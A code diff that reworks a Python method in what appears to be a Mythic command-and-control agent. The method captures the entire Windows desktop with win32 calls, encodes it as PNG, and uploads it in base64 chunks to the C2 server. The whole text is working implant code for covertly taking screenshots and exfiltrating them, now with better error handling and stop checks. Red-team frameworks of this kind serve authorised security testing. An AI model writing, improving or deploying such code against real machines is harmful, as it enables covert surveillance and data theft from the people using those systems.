@@ -1,89 +1,103 @@
-def screenshot2(self, task_id):
-    import json, base64, io
-    from datetime import datetime
-    import win32gui, win32ui, win32con, win32api
+    def screenshot2(self, task_id):
+        if platform.system() != 'Windows':
+            return "screenshot2: only supported on Windows"
 
-    # define tamanho da tela
-    hdesktop = win32gui.GetDesktopWindow()
-    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
-    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
-    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
-    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
+        try:
+            import win32gui, win32ui, win32con, win32api
+            from PIL import Image
+            import io
 
-    # cria DC compatível e bitmap
-    desktop_dc = win32gui.GetWindowDC(hdesktop)
-    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
-    mem_dc = img_dc.CreateCompatibleDC()
-    screenshot = win32ui.CreateBitmap()
-    screenshot.CreateCompatibleBitmap(img_dc, width, height)
-    mem_dc.SelectObject(screenshot)
+            hdesktop = win32gui.GetDesktopWindow()
+            width    = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+            height   = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
+            left     = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
+            top      = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
 
-    # copia pixels da tela para o bitmap
-    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
+            desktop_dc = win32gui.GetWindowDC(hdesktop)
+            img_dc     = win32ui.CreateDCFromHandle(desktop_dc)
+            mem_dc     = img_dc.CreateCompatibleDC()
+            bmp        = win32ui.CreateBitmap()
+            bmp.CreateCompatibleBitmap(img_dc, width, height)
+            mem_dc.SelectObject(bmp)
+            mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
 
-    # salva em memória como BMP
-    bmpinfo = screenshot.GetInfo()
-    bmpstr = screenshot.GetBitmapBits(True)
+            bmpinfo = bmp.GetInfo()
+            bmpstr  = bmp.GetBitmapBits(True)
+            mem_dc.DeleteDC()
+            win32gui.DeleteObject(bmp.GetHandle())
 
-    # converte para PNG (precisa do Pillow apenas no agente de build, não no alvo)
-    try:
-        from PIL import Image
-        im = Image.frombuffer(
-            'RGB',
-            (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
-            bmpstr, 'raw', 'BGRX', 0, 1
-        )
-        buf = io.BytesIO()
-        im.save(buf, format="PNG")
-        sh_data = buf.getvalue()
-    except Exception as e:
-        # fallback: salva como BMP cru
-        sh_data = bmpstr
+            im  = Image.frombuffer(
+                'RGB',
+                (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
+                bmpstr, 'raw', 'BGRX', 0, 1
+            )
+            buf = io.BytesIO()
+            im.save(buf, format="PNG")
+            sh_data = buf.getvalue()
 
-    # libera objetos GDI
-    mem_dc.DeleteDC()
-    win32gui.DeleteObject(screenshot.GetHandle())
+        except Exception as e:
+            with self._taskings_lock:
+                task = next((t for t in self.taskings if t["task_id"] == task_id), None)
+            if task:
+                task["result"]    = "Screenshot capture failed: {}".format(e)
+                task["error"]     = True
+                task["completed"] = True
+            return None
 
-    # envia em chunks para o Mythic
-    file_size = len(sh_data)
-    if file_size > 0:
-        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)
-        data = {
-            "action": "post_response", 
-            "responses": [
-                {
-                    "task_id": task_id,
-                    "total_chunks": total_chunks,
-                    "file_path": str(datetime.now()),
-                    "chunk_size": CHUNK_SIZE,
-                    "is_screenshot": True 
-                }
-            ]
-        }
-        initial_response = self.postMessageAndRetrieveResponse(data)
+        try:
+            file_size    = len(sh_data)
+            total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
+            ts           = datetime.now().strftime('%Y%m%d_%H%M%S')
 
-        for i in range(total_chunks):
-            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
-                return "Job stopped."
+            init_resp = self.postMessageAndRetrieveResponse({
+                "action": "post_response",
+                "responses": [{
+                    "task_id":       task_id,
+                    "total_chunks":  total_chunks,
+                    "file_path":     "screenshot_{}.png".format(ts),
+                    "chunk_size":    CHUNK_SIZE,
+                    "is_screenshot": True
+                }]
+            })
 
-            if i == total_chunks - 1:
-                content = sh_data[i*CHUNK_SIZE:]
-            else:
-                content = sh_data[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]
+            responses_list = init_resp.get("responses", [])
+            file_id = responses_list[0].get("file_id") if responses_list else None
 
-            chunk = {
-                "action": "post_response", 
-                "responses": [
-                    {
-                        "chunk_num": i+1,
-                        "file_id": initial_response["responses"][0]["file_id"],
-                        "chunk_data": base64.b64encode(content).decode(),
-                        "task_id": task_id                        
-                    }
-                ]
-            }
-            self.postMessageAndRetrieveResponse(chunk)
+            if not file_id:
+                raise ValueError("Mythic nao retornou file_id. Resposta: {}".format(init_resp))
 
-        return json.dumps({ "file_id": initial_response["responses"][0]["file_id"] })
-    else:
-        return json.dumps({ "error": "Failed to capture screenshot" })
+            for i in range(total_chunks):
+                with self._taskings_lock:
+                    stopped = next(
+                        (t["stopped"] for t in self.taskings if t["task_id"] == task_id),
+                        False
+                    )
+                if stopped:
+                    break
+                chunk_data = sh_data[i * CHUNK_SIZE:(i + 1) * CHUNK_SIZE]
+                self.postMessageAndRetrieveResponse({
+                    "action": "post_response",
+                    "responses": [{
+                        "task_id":    task_id,
+                        "chunk_num":  i + 1,
+                        "file_id":    file_id,
+                        "chunk_data": base64.b64encode(chunk_data).decode()
+                    }]
+                })
+
+            with self._taskings_lock:
+                task = next((t for t in self.taskings if t["task_id"] == task_id), None)
+            if task:
+                task["result"]           = json.dumps({"file_id": file_id})
+                task["_screenshot_sent"] = True
+                task["completed"]        = True
+
+        except Exception as e:
+            with self._taskings_lock:
+                task = next((t for t in self.taskings if t["task_id"] == task_id), None)
+            if task:
+                task["result"]    = "Screenshot send failed: {}".format(e)
+                task["error"]     = True
+                task["completed"] = True
+
+        return None
